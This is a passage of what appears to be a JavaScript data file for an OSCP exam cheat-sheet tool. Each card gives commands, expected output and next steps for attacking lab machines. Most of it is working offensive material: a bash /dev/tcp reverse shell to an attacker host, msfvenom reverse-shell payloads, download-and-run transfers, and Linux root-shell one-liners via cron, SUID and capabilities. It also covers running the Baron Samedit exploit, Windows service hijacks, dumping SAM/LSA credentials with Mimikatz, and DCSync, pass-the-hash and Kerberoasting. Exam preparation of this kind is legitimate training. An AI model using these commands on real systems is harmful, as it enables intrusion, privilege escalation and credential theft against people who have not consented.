    dead: "Scanner noise about headers and no users, no version, no login. Treat it as a normal site.",
    next: "Default creds, then upload or template edit. That is the usual OSCP CMS path.",
  },
  {
    id: "web-xss",
    section: "Web",
    title: "XSS",
    look: "Your HTML comes back unencoded. On OSCP this matters when it steals a session or gets stored in an admin page. Reflected alert boxes alone rarely score.",
    cmd: `# prove reflection first
<script>alert(1)</script>
<img src=x onerror=alert(1)>`,
    alive: "The browser runs it, and an admin or your own higher session will load that page.",
    dead: "Encoded as text, or only you can see it. Skip.",
    next: "Session cookie or a stored payload on a page a privileged user opens. If there is no other user, XSS is a dead end.",
  },
  {
    id: "sh-penelope",
    section: "Shells",
    title: "Penelope listener",
    look: "Use Penelope instead of plain nc when you want the upgrade, upload, and download without a second tool.",
    cmd: `# Kali. -p is the port. Without it, Penelope listens on 4444.
# -O keeps the exam modules off: no meterpreter, no automatic privesc.
penelope -O -p 443
python3 ~/tools/penelope/penelope.py -O -p 443

# on the target, after you know a command runs
bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'`,
    alive: "Penelope prints a session and a prompt. The shell survives a directory change and you can use its download/upload menu.",
    dead: "Listener up, nothing connects. The command never ran, or LHOST is your VPN IP written wrong.",
    next: "The Listener card on this page starts Penelope and can type the menu for you. Copy the line if you want it in your own terminal. id or whoami before any privesc.",
  },
  {
    id: "sh-penelope-sheet",
    section: "Shells",
    title: "Penelope cheat sheet",
    look: "The listener is already up. F12 leaves the shell and opens the menu. upload and download are menu commands. Typed in the target shell, bash says they do not exist.",
    cmd: `# START
penelope -O -p 443
# more than one port
penelope -O -p 443,80
# only the VPN interface
penelope -O -i tun0 -p 443
# they are listening. You connect. This is a bind shell, not a reverse shell.
penelope -O -c <target> -p 4444

# KEYS. The session banner prints the right one.
# F12       PTY shell -> menu
# Ctrl+C    raw shell -> menu. In the menu this does not kill Penelope.
# Ctrl+D    exit the menu

# MENU
sessions
interact 1
upload /home/kali/linpeas.sh /tmp/linpeas.sh
download /root/proof.txt /home/kali/exam/loot/proof.txt
upgrade
spawn
payloads
listeners
portfwd
kill 1
help upload
# payloads prints a callback aimed at the listener you opened. Copy that line.
# portfwd is one port through this session. A subnet is still the Tunneling tab.`,
    alive: "F12 shows the menu, sessions lists the host, and download writes proof.txt on Kali.",
    dead: "upload: command not found. You are still in the target shell. F12, then upload. Or nothing arrived: the payload used 443 and Penelope is still on 4444.",
    next: "id, then the Linux or Windows page. A meterpreter payload will never show up here.",
  },
  {
    id: "sh-tty",
    section: "Shells",
    title: "TTY upgrade",
    look: "A dumb shell: no tab complete, sudo fails with 'no tty', Ctrl-C kills it. Penelope usually does this for you. If you are on nc, upgrade by hand.",
    cmd: `python3 -c 'import pty;pty.spawn("/bin/bash")'
# then Ctrl-Z
stty raw -echo; fg
export TERM=xterm`,
    alive: "Clear works, arrow keys work, sudo -l can ask for a password without dying.",
    dead: "python3 is missing. Try script /dev/null -c bash or stay on Penelope.",
    next: "sudo -l on Linux. whoami /priv on Windows.",
  },
  {
    id: "sh-msfvenom",
    section: "Shells",
    title: "Payload formats",
    look: "Match the OS and the file type the app will execute. x64 Windows gets an x64 payload. A .exe named like the real service binary is for service hijack, not for a PHP upload.",
    cmd: `# Linux elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f elf -o shell.elf
# Windows exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell.exe
# MSI only for AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f msi -o setup.msi
# add a user, no listener needed
msfvenom -p windows/x64/exec CMD='net localgroup administrators <you> /add' -f exe -o addadmin.exe`,
    alive: "file says ELF 64-bit or PE32+ and the size is tens of KB or more, not a few hundred bytes.",
    dead: "A 441 byte file, or GLIBC errors on a payload you compiled yourself on a newer Kali. See Compile.",
    next: "Or open Builder and pick the architecture and file type. Transfer with the next cards. Start Penelope before you execute. Meterpreter will not talk to Penelope.",
  },
  {
    id: "sh-xfer-lin",
    section: "Shells",
    title: "Transfer to Linux",
    look: "Which client exists: curl, wget, python, or base64 if nothing else.",
    cmd: `# Kali
python3 -m http.server 80
# target
curl -o /tmp/linpeas.sh http://<KALI>/linpeas.sh
wget http://<KALI>/linpeas.sh -O /tmp/linpeas.sh`,
    alive: "The file size on the target matches Kali (ls -l both sides).",
    dead: "HTML error page saved as the script. head the file. If it starts with <html, the URL is wrong.",
    next: "The Transfer card fills in your tun0 address. Do not put 127.0.0.1 in the URL. chmod +x only for binaries. Read scripts before you pipe them to bash.",
  },
  {
    id: "sh-xfer-win",
    section: "Shells",
    title: "Transfer to Windows",
    look: "certutil or PowerShell IWR. Check the size. GodPotato and PrintSpoofer are megabyte-scale, not 441 bytes.",
    cmd: `certutil -urlcache -split -f http://<KALI>/tool.exe C:\\Users\\Public\\tool.exe
powershell -c "IWR http://<KALI>/tool.exe -OutFile C:\\Users\\Public\\tool.exe"
dir C:\\Users\\Public\\tool.exe`,
    alive: "Size matches the Kali file. file on Kali said PE32+.",
    dead: "The system cannot execute the specified program, and dir shows a few hundred bytes. You downloaded a GitHub HTML page.",
    next: "The Transfer card fills in your tun0 address and this file. Run it from C:\\Users\\Public, not a path you cannot write.",
  },
  {
    id: "lin-order",
    section: "Linux",
    title: "Order",
    look: "sudo, SUID, capabilities, cron, credentials, groups. Kernel and sudo CVEs only after those are clean.",
    cmd: `id; whoami; hostname; uname -a
sudo -l
sudo --version
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron 2>/dev/null
ss -tlnp || netstat -tlnp`,
    alive: "Any NOPASSWD line, a SUID file outside the standard set, cap_setuid, or a cron script you can write.",
    dead: "sudo asks for a password you do not have, SUID is only passwd/sudo/su, getcap is empty, crontab is the default run-parts lines.",
    next: "Work the first alive item. Do not open linux-exploit-suggester yet.",
  },
  {
    id: "lin-sudo",
    section: "Linux",
    title: "sudo -l",
    look: "NOPASSWD, or env_keep / SETENV for LD_PRELOAD and LD_LIBRARY_PATH. A password prompt means you cannot use sudo until you know the password.",
    cmd: `sudo -l
sudo --version`,
    alive: `(root) NOPASSWD: /usr/bin/find
env_keep+=LD_PRELOAD
env_keep+=LD_LIBRARY_PATH`,
    dead: `[sudo] password for user:
Sorry, try again.`,
    next: "NOPASSWD binary with no pinned arguments: the Named binary card has the one-liner. env_keep: the LD cards. Password prompt: leave sudoers and continue the list. Baron Samedit does not care that sudo -l asked for a password. It is the version cards after groups, and only if this list is clean.",
  },
  {
    id: "lin-suid",
    section: "Linux",
    title: "SUID",
    look: "A root-owned file with the setuid bit that is not a normal system tool. Custom paths (/opt, /usr/local, /home) are the interesting ones.",
    cmd: `find / -perm -4000 -type f 2>/dev/null`,
    alive: `/opt/backup/agent
/usr/local/bin/custom`,
    dead: `Only /usr/bin/passwd, sudo, su, chfn, newgrp, mount, umount, fusermount, and snap helpers.`,
    next: "Standard list: skip SUID. Custom binary: run it with -h, strings, and ltrace, or check GTFOBins if the name is known (find, vim, nmap, bash). If strace shows it opening a library that does not exist, that is the SUID shared object card, not LD_PRELOAD.",
  },
  {
    id: "lin-caps",
    section: "Linux",
    title: "Capabilities",
    look: "cap_setuid on an interpreter, or cap_dac_override / cap_dac_read_search on something that reads files.",
    cmd: `getcap -r / 2>/dev/null
# cap_setuid on an interpreter
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
php -r 'posix_setuid(0); system("/bin/bash");'
# cap_dac_read_search. This reads a file. It is not a shell.
python3 -c 'print(open("/etc/shadow").read())'`,
    alive: `/usr/bin/python3 cap_setuid=ep`,
    dead: "Empty output, or only common ping/mtr capabilities.",
    next: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' when cap_setuid is really on python.",
  },
  {
    id: "lin-cron",
    section: "Linux",
    title: "Cron",
    look: "Identify: a root crontab line runs a script you can write, or pspy shows root running tar with a bare * in a directory you can write. Stock run-parts lines are not this path.",
    cmd: `# 1. Identify
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily
ls -la /opt/scripts/backup.sh
./pspy64
# 2. Writable script. One line, then wait for the next run.
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > /opt/scripts/backup.sh
# 3. After the job runs
ls -la /tmp/rootbash
/tmp/rootbash -p
id`,
    alive: `* * * * * root /opt/scripts/backup.sh
-rwxrwxrwx you you /opt/scripts/backup.sh
-rwsr-xr-x root root /tmp/rootbash
uid=0(root)`,
    dead: "Only the stock run-parts lines, and ls of those directories is not writable. /usr/sbin/anacron missing is normal.",
    next: "Overwrite the script, or for a tar wildcard plant a checkpoint file. Wait one cycle. Do not stare for twenty minutes if the schedule is monthly.",
  },
  {
    id: "lin-ldpreload",
    section: "Linux",
    title: "LD_PRELOAD",
    look: "sudo -l keeps LD_PRELOAD (env_keep or SETENV) and you may run a command as root. The library is loaded into that root process. This is not 'I can edit the system library'.",
    cmd: `# confirm
sudo -l | grep -i ld_preload
# compile a shared object that spawns a shell in a constructor
gcc -fPIC -shared -nostartfiles -o /tmp/p.so p.c
sudo LD_PRELOAD=/tmp/p.so <allowed-command>`,
    alive: "sudo -l lists env_keep+=LD_PRELOAD and the allowed command starts.",
    dead: "env_reset with no keep. sudo strips LD_PRELOAD. Also dead on a SUID binary you run without sudo: the linker ignores LD_* when AT_SECURE is set.",
    next: "If the constructor runs, you get a root shell. If the program expects symbols and crashes, unsetenv LD_PRELOAD inside the constructor and keep it small. The Scripts section has ld_preload_check.py.",
  },
  {
    id: "lin-ldpath",
    section: "Linux",
    title: "LD_LIBRARY_PATH",
    look: "Same idea as LD_PRELOAD, but you must match a real library name from ldd. You are not editing the file in /usr/lib. You are telling the dynamic linker to look in your directory first, and sudo is allowing that variable through.",
    cmd: `sudo -l | grep -i ld_library
ldd /usr/bin/<allowed>
# hijack a name ldd prints, for example libselinux.so.1
gcc -shared -fPIC -o /tmp/libselinux.so.1 hijack.c
sudo LD_LIBRARY_PATH=/tmp <allowed>`,
    alive: "ldd shows a normal .so (not a static binary) and env_keep lists LD_LIBRARY_PATH. After it works, whoami is root.",
    dead: "No env_keep. Or ldd says 'not a dynamic executable'. Or you planted an empty file and the loader says 'file too short' / undefined symbol. A stub must export the symbols the binary actually uses, or the constructor never runs.",
    next: "Prefer a small library from ldd. If symbols are missing, the process dies before your code. That is a failed hijack, not 'sudo blocked you'. The Scripts section has ld_library_path_check.py.",
  },
  {
    id: "lin-creds",
    section: "Linux",
    title: "Credentials on disk",
    look: "History, config files, .git, id_rsa, reused passwords for the next user or for root.",
    cmd: `cat ~/.bash_history
find /home /opt /var/www -type f -readable \\( -name '*.conf' -o -name '*.config' -o -name '*.php' -o -name 'id_rsa' -o -name '.git' \\) 2>/dev/null | head
grep -RIn --exclude-dir=proc 'password' /home /opt /var/www 2>/dev/null | head`,
    alive: "A password in history or a config that matches another user. su or ssh works.",
    dead: "grep hits the word password inside a help file and nowhere else.",
    next: "Try the password for every local user and for root before you continue.",
  },
  {
    id: "lin-groups",
    section: "Linux",
    title: "Groups, docker, lxd",
    look: "id shows docker or lxd. That is root if the daemon is running. Writable /etc/passwd is rarer and obvious.",
    cmd: `id
ls -la /etc/passwd /etc/shadow
# docker
docker image ls
docker run -v /:/mnt --rm -it alpine chroot /mnt sh`,
    alive: "uid=0 inside the container with the host filesystem mounted, or you can write /etc/passwd.",
    dead: "groups are only users, and passwd is not writable. Docker not installed.",
    next: "From the chroot, you are root on the host. Read proof.txt. If docker is not installed, the Baron cards are next, and only because the list above was clean.",
  },
  {
    id: "lin-baron",
    section: "Linux",
    title: "Baron Samedit 1 — version",
    look: "The misconfig list is dead and sudo itself is old. CVE-2021-3156 is a bug in the sudo binary. It is not a kernel bug and it does not need a sudoers entry. A password prompt on sudo -l changes nothing.",
    cmd: `sudo --version
ls -l "$(command -v sudo)"
# Vulnerable windows, both of them:
# 1.8.2 through 1.8.31p1. The fix in that branch is 1.8.31p2.
# 1.9.0 through 1.9.5p1. The fix is 1.9.5p2.
# 1.9.5p2, 1.9.6 and anything newer are patched.
# A distro can backport the fix and still print an old number. The next card is the real test.`,
    alive: `Sudo version 1.8.31
# or 1.8.31p1, or 1.9.5p1, or any build inside the two windows
# and ls shows an s in the owner execute position: -rwsr-xr-x root root`,
    dead: "1.8.31p2, 1.9.5p2, or newer. Or sudo is not setuid, so the s is missing. Stop. Do not fetch a PoC.",
    next: "The crash test. The version only earns you that test. It does not earn you an exploit yet.",
  },
  {
    id: "lin-baron-test",
    section: "Linux",
    title: "Baron Samedit 2 — prove it",
    look: "You have not downloaded anything. sudoedit -s / is the check. Patched sudo prints a usage line. Vulnerable sudo complains that / is not a regular file. A backported patch keeps the old version number and still prints usage.",
    cmd: `sudoedit -s /
# if that output is confusing, force the overflow. This is still a test, not the exploit.
sudoedit -s '\\' $(python3 -c 'print("A"*1000)')
# no python3
sudoedit -s '\\' $(perl -e 'print "A" x 1000')`,
    alive: `sudoedit: /: not a regular file
# or, from the long input
malloc(): corrupted top size
Aborted (core dumped)
# Segmentation fault is the same answer`,
    dead: `usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
# The process did not abort. The box is patched. Stop.
# If it asks for a password, you typed sudo -s, not sudoedit -s.`,
    next: "Only a crash or the 'not a regular file' line earns a PoC. A usage line ends Baron Samedit.",
  },
  {
    id: "lin-baron-run",
    section: "Linux",
    title: "Baron Samedit 3 — run it",
    look: "Use the Python PoC you already practised if python3 exists. It avoids gcc. A C PoC is compiled on this box, never on Kali. One target from the PoC's list. A second target only if the first says it failed. Then you stop.",
    cmd: `# Kali. The file is the PoC you practised, already on disk.
cd ~/exam/<ip>/shells
python3 -m http.server 80
# target
cd /tmp
curl -o baron.py http://<KALI>/baron.py
python3 baron.py
id
# C PoC, only if there is no python3. Compile here.
curl -o baron.c http://<KALI>/baron.c
gcc baron.c -o baron
./baron
id`,
    alive: `uid=0(root) gid=0(root) groups=0(root)
# then
cat /root/proof.txt`,
    dead: "The PoC prints failed, or it drops you back at your user. One more target from that PoC's own list. If that fails too, the test in the previous card was misread. Stop. Do not switch to a kernel exploit.",
    next: "Screenshot id, hostname, and proof.txt before you do anything else. A new password in root's files is a spray of one password, not a second exploit.",
  },
  {
    id: "lin-baron-fail",
    section: "Linux",
    title: "Baron Samedit 4 — when the build fails",
    look: "Three messages that mean you broke the file, not that sudo is safe. None of them means you should start a kernel exploit.",
    cmd: `# GLIBC_2.34 not found
# You compiled on Kali and copied the binary. Delete it. Compile on the target.
# If the target has no gcc, rebuild on Kali with -static and check the next line.
file ./baron
gcc -static baron.c -o baron
file ./baron
# invalid preprocessing directive #Exploit
# Delete every line before the first #include. Those are the Exploit-DB banner, not C.
# missing terminating " character
# A string was split across two lines. Put it back on one line.
file baron.py
head -n 2 baron.py`,
    alive: "file says ELF, statically linked if you built it on Kali, and python3 baron.py or ./baron actually starts.",
    dead: "The same GLIBC line after another dynamic build. Or head shows <!DOCTYPE. You downloaded the web page. A 441-byte file is that page.",
    next: "One fixed build, one run. If it runs and does not give uid=0, Baron is over. The kernel card is next only if uname is also old.",
  },
  {
    id: "lin-kernel",
    section: "Linux",
    title: "Kernel last",
    look: "uname is old and every card above is dead, including the Baron crash test. PwnKit is pkexec --version, not uname. Dirty Pipe is only kernel 5.8 through 5.16.10. A random Exploit-DB kernel is not the next step.",
    cmd: `uname -a
pkexec --version
# Dirty Pipe only if the number is 5.8 through 5.16.10
# one PoC you have already compiled for that exact range`,
    alive: "A version string that matches one public local bug you have practised for that exact build, and Baron and pkexec were already dead.",
    dead: "Ubuntu with a high patch number, or Server-style kernels with backports. uname looking old is not enough. If the one PoC fails, stop.",
    next: "One exploit. Compile it with the Compile cards. If it fails once, the Linux list is finished.",
  },
  {
    id: "win-land",
    section: "Windows",
    title: "Landing checks",
    look: "Who you are, integrity, privileges, and whether this is a service account. NT AUTHORITY\\SERVICE is not SYSTEM. High integrity without Administrators is not admin.",
    cmd: `whoami
whoami /all
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname
net user
net localgroup administrators`,
    alive: `SeImpersonatePrivilege  Impersonate a client  Enabled
BUILTIN\\Administrators
# or whoami is nt authority\\system`,
    dead: `BUILTIN\\Users
NT AUTHORITY\\SERVICE
Mandatory Label\\High Mandatory Level
# and Administrators is missing`,
    next: "If SeImpersonate is listed, go to Potatoes before services. If not, services and creds.",
  },
  {
    id: "win-svc-perm",
    section: "Windows",
    title: "Weak service permissions",
    look: "Your user has SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS, and the service runs as LocalSystem. You change binPath. You do not replace the exe. Penelope is listening before sc start.",
    cmd: `accesschk.exe /accepteula -uwcqv <user> *
sc qc <svc>
# success so far: SERVICE_CHANGE_CONFIG and SERVICE_START_NAME : LocalSystem
sc config <svc> binPath= "C:\\Users\\Public\\shell.exe"
sc stop <svc>
sc start <svc>
whoami`,
    alive: `RW <user>
  SERVICE_CHANGE_CONFIG
SERVICE_START_NAME : LocalSystem
# then sc start runs, and whoami prints
nt authority\\system`,
    dead: "accesschk shows only SERVICE_QUERY_CONFIG. Or sc config says Access is denied. Or sc start says Access is denied and START_TYPE is DEMAND_START, so a reboot will not save you.",
    next: "The space after binPath= is required. Quote the service name only when the name itself contains a space. Write the original BINARY_PATH_NAME down before you change it.",
  },
  {
    id: "win-unquoted",
    section: "Windows",
    title: "Unquoted service path",
    look: "Three things, all of them. The binary path has a space and no quotes. The service runs as LocalSystem. A folder before one of those spaces is writable by you. Windows walks the path from the left and stops at each space. It does not try names in alphabetical order.",
    cmd: `# 1. Candidates. Drop Windows services and anything already quoted.
wmic service get name,pathname,startname,startmode | findstr /i /v "C:\\Windows\\" | findstr /i /v """
# 2. One service. Read BINARY_PATH_NAME and SERVICE_START_NAME.
sc qc <svc>
# Example path, not a command:
#   C:\\Program Files\\Unquoted Path Service\\common files\\svc.exe
# Windows tries, in this order, then the real exe:
#   C:\\Program.exe
#   C:\\Program Files\\Unquoted.exe
#   C:\\Program Files\\Unquoted Path.exe
#   C:\\Program Files\\Unquoted Path Service\\common.exe
# 3. Which of those folders can you write? (M), (F), or FILE_ADD_FILE.
icacls "C:\\Program Files"
icacls "C:\\Program Files\\Unquoted Path"
icacls "C:\\Program Files\\Unquoted Path Service"
# 4. Plant the reverse shell under the name Windows will try.
# Penelope is already listening. If "Unquoted Path" is writable:
copy C:\\Users\\Public\\shell.exe "C:\\Program Files\\Unquoted.exe"
# If only the next folder is writable:
copy C:\\Users\\Public\\shell.exe "C:\\Program Files\\Unquoted Path Service\\common.exe"
# 5. Restart. Then confirm.
sc stop <svc>
sc start <svc>
whoami`,
    alive: `BINARY_PATH_NAME   : C:\\Program Files\\Unquoted Path Service\\common files\\svc.exe
SERVICE_START_NAME : LocalSystem
# icacls on one parent shows (M) or (F) or FILE_ADD_FILE for you
# sc start runs, Penelope receives the callback, and whoami prints
nt authority\\system`,
    dead: "The path is wrapped in quotes. Or every folder you would plant in is (RX). C:\\ and C:\\Program Files are usually not writable, so C:\\Program.exe is almost never the plant. Access is denied on copy means that folder was the wrong one.",
    next: "One plant, one restart. If sc start says Access is denied and the service is not AUTO_START, park it. Do not drop exe files in every folder.",
  },
  {
    id: "win-file",
    section: "Windows",
    title: "Writable service binary",
    look: "icacls on the service exe itself shows you can overwrite it, and sc qc says LocalSystem. This is not an unquoted path. An unquoted path does not make the existing exe writable.",
    cmd: `sc qc <svc>
icacls "C:\\Program Files\\Vendor\\svc.exe"
copy "C:\\Program Files\\Vendor\\svc.exe" C:\\Users\\Public\\svc.exe.bak
copy /Y C:\\Users\\Public\\shell.exe "C:\\Program Files\\Vendor\\svc.exe"
sc stop <svc> & sc start <svc>
whoami`,
    alive: "icacls shows (F), (M), or FILE_WRITE_DATA for you or Everyone. copy prints 1 file(s) copied. whoami prints nt authority\\system.",
    dead: "Access is denied on the copy. The folder being writable is a different card. The path being unquoted is the previous card.",
    next: "The .bak is the original. Put it back after the screenshot if the service matters. Penelope was listening before sc start.",
  },
  {
    id: "win-aie",
    section: "Windows",
    title: "AlwaysInstallElevated",
    look: "Both HKLM and HKCU must be 0x1. One hive is not enough. The MSI is a Windows reverse shell. Penelope is listening before msiexec.",
    cmd: `reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# both printed 0x1. Then, on the target:
msiexec /quiet /qn /i C:\\Users\\Public\\setup.msi
whoami`,
    alive: "Both queries print 0x1. msiexec returns, Penelope shows a session, and whoami prints nt authority\\system.",
    dead: "The system was unable to find the specified registry key, or one of the two values is 0x0. Do not run msiexec on a single 0x1.",
    next: "The MSI is built on Kali with the msfvenom builder, format msi, before you copy it to Public. One install.",
  },
  {
    id: "win-potato",
    section: "Windows",
    title: "Potatoes",
    look: "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is listed. Disabled still counts. Missing means skip the whole family. This is not Incognito and not a stolen token.",
    cmd: `whoami /priv
sc query spooler
systeminfo | findstr /C:"System Type"
# spooler RUNNING, try PrintSpoofer first
PrintSpoofer.exe -i -c cmd
# else
GodPotato-NET4.exe -cmd "cmd /c whoami"`,
    alive: `whoami
nt authority\\system`,
    dead: "Privilege name not in the list. Or 'cannot execute the specified program' because the exe is 441 bytes. Check dir. A real build is hundreds of KB.",
    next: "One tool, once. If both fail, stop spraying and go back to services and files.",
  },
  {
    id: "win-tasks",
    section: "Windows",
    title: "Tasks, startup, autoruns",
    look: "A scheduled task, a Run key, or the Startup folder points at a file you can replace, and that task runs as SYSTEM or an admin. Reading the key is not the bug. Replacing the target is.",
    cmd: `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run Run As User"
icacls "C:\\Program Files\\Vendor\\job.exe"
icacls "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
# task exe is writable and Run As User is SYSTEM
copy /Y C:\\Users\\Public\\shell.exe "C:\\Program Files\\Vendor\\job.exe"
schtasks /run /tn "\\Vendor\\job"
whoami`,
    alive: "Run As User is SYSTEM, icacls on that exe shows (F) or (M), schtasks /run says SUCCESS, and whoami prints nt authority\\system.",
    dead: "You can read the tasks and the Run keys, and icacls on every target is (RX). HKCU Run runs as you, which is not privilege escalation.",
    next: "If /run says Access is denied, the file still waits for the next logon of that account. Note it and keep going. Do not sit on that logon.",
  },
  {
    id: "win-creds",
    section: "Windows",
    title: "Credential files",
    look: "PowerShell history, unattend, web.config, cmdkey, Winlogon defaults. History is how lab boxes leak the next user's password.",
    cmd: `cmdkey /list
type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
dir /s /b C:\\*unattend*.xml C:\\*sysprep*.inf 2>nul
findstr /si password *.xml *.config *.txt *.ini 2>nul`,
    alive: "A clear password in history or unattend that is in Administrators.",
    dead: "findstr prints the word password inside a help page and cmdkey says no stored credentials.",
    next: "Try that password with evil-winrm or runas before you touch Mimikatz.",
  },
  {
    id: "win-sam",
    section: "Windows",
    title: "SAM and LSA",
    look: "You are already admin. 32-bit Mimikatz on a 64-bit OS fails with 0x00000005. That is the wrong binary, not an empty SAM.",
    cmd: `# reliable
reg save HKLM\\SAM C:\\Users\\Public\\sam.save
reg save HKLM\\SYSTEM C:\\Users\\Public\\system.save
reg save HKLM\\SECURITY C:\\Users\\Public\\security.save
# Kali
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# if you use Mimikatz, it must be the x64 build, elevated
privilege::debug
token::elevate
lsadump::sam
lsadump::secrets`,
    alive: "Local user NTLM hashes, or a _SC_ secret with cur/text (a service password).",
    dead: "Handle on memory (0x00000005) or RegOpenKeyEx SAM (0x00000005) from an x86 build. Banner says (x86). DPAPI_SYSTEM and NL$KM hex blobs are keys, not logins. NT Service\\ lines with no cur/text are empty.",
    next: "Crack or pass-the-hash the SAM users. Only cur/text under _SC_ is a password you can type.",
  },
  {
    id: "win-kernel",
    section: "Windows",
    title: "Kernel last",
    look: "systeminfo shows an old build and very few hotfixes, and every card above was dead. Potatoes and services come first.",
    cmd: `systeminfo > C:\\Users\\Public\\sys.txt
wmic qfe get HotFixID,InstalledOn`,
    alive: "An old build (for example 14393 with almost no KBs) and a suggester that names one issue you can actually run for that architecture.",
    dead: "Server 2022 or Windows 10/11 with a long hotfix list. Do not compile kernel exploits there.",
    next: "Match x64 vs x86. One exploit. If it fails once, stop.",
  },
  {
    id: "ad-start",
    section: "Active Directory",
    title: "Are you on a domain?",
    look: "whoami /all shows a domain, or ipconfig shows a DNS suffix. WORKGROUP means this page does not apply.",
    cmd: `whoami /all
ipconfig /all
nltest /dclist:<domain>
# from Kali, once you have any domain cred
nxc smb <cidr> -u <user> -p '<pass>'`,
    alive: "A domain name and a domain controller. nxc marks one host (Pwn3d!) or at least [+] for valid creds.",
    dead: "Domain name : WORKGROUP. Stop. Finish the local box.",
    next: "Or open Builders and pick nxc. Valid creds go into BloodHound and the roast checks. Invalid creds do not. Do not spray rockyou at a DC.",
  },
  {
    id: "ad-enum",
    section: "Active Directory",
    title: "Enum with creds",
    look: "Users, groups, computers, and anything with a description or an SPN. You are looking for a path, not a complete phone book.",
    cmd: `nxc smb <dc> -u <user> -p '<pass>' --users
nxc smb <dc> -u <user> -p '<pass>' --groups
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <dc> -c All --zip`,
    alive: "A user with adminCount, a description containing a password, or a BloodHound path from your user to Domain Admins.",
    dead: "You are a domain user with no outbound edges and no SPNs. Local privesc on the box you are on is the next step, not more LDAP.",
    next: "Follow the shortest BloodHound path. Do not collect three times.",
  },
  {
    id: "ad-roast",
    section: "Active Directory",
    title: "Kerberoast and AS-REP",
    look: "Kerberoast: a user with an SPN. AS-REP: a user with 'Do not require pre-auth'. Both give you a hash to crack, not a shell.",
    cmd: `impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <dc> -request
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc> -no-pass
# crack
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`,
    alive: "$krb5tgs$23$ or $krb5asrep$18$ and later hashcat says Cracked.",
    dead: "No entries, or hashcat exhausts rockyou. A service account with a long random password will not fall. Move on.",
    next: "The clear password is tried everywhere, especially on the host that service runs on.",
  },
  {
    id: "ad-pth",
    section: "Active Directory",
    title: "Pass the hash",
    look: "You have an NTLM hash for a local admin or a domain user who is admin somewhere. You do not need the clear password.",
    cmd: `nxc smb <targets> -u <user> -H <ntlm> --local-auth
nxc smb <targets> -u <user> -H <ntlm>
impacket-psexec <domain>/<user>@<ip> -hashes :<ntlm>`,
    alive: "(Pwn3d!) or a system shell.",
    dead: "STATUS_LOGON_FAILURE, or Pwn3d only on the machine you already own. Hashes from a workgroup box do not magically open a DC.",
    next: "The new host gets the Windows landing checks again. Do not assume SYSTEM.",
  },
  {
    id: "ad-dcsync",
    section: "Active Directory",
    title: "DCSync and domain admin",
    look: "You are already a domain admin, or BloodHound shows Replication rights. This dumps hashes. It is the end of the domain, not a foothold.",
    cmd: `impacket-secretsdump <domain>/<user>:'<pass>'@<dc>`,
    alive: "krbtgt and Administrator NTLM in the output.",
    dead: "NTSTATUS access denied. You are not there yet. Go back to the BloodHound path.",
    next: "Pass the Administrator hash to the DC and read proof.txt. A golden ticket is persistence, not required to score the set.",
  },
  {
    id: "pw-id",
    section: "Passwords",
    title: "Identify the hash",
    look: "The prefix tells you the mode. Guessing -m wastes the run.",
    cmd: `hashid '<hash>'
# or
john --list=formats | head`,
    alive: `NTLM, mode 1000
NetNTLMv2, mode 5600
Kerberos 5 TGS-REP etype 23, mode 13100
AS-REP, mode 18200
bcrypt, mode 3200`,
    dead: "hashid says Unknown and the string still has a username: prefix. Strip the name before you crack. Keep user:hash only for the tool that wants it.",
    next: "Or open Builders and pick identify. Paste the messy line. It writes the hashcat file and the John file. One mode, rockyou first. If the hash is NTLM from a domain admin, pass it instead of cracking it.",
  },
  {
    id: "pw-john",
    section: "Passwords",
    title: "John",
    look: "John wants its own format for SSH keys, zip, and some Linux hashes. hashcat is usually better for NTLM and Kerberos.",
    cmd: `# SSH key
ssh2john id_key > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
john --show key.hash

# Linux shadow
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`,
    alive: `id_key:thepassword
user:password`,
    dead: "No password hashes loaded. The file is still OpenSSH armor or you pointed john at the wrong half. Or 'exhausted' with no crack: the password is not in rockyou.",
    next: "Or open Builders and pick john. Use the password. Do not start a rules marathon in the exam unless this is the only lead.",
  },
  {
    id: "pw-hashcat",
    section: "Passwords",
    title: "Hashcat",
    look: "Mode, then a clean hash file, then rockyou. Status Cracked is the only success.",
    cmd: `hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
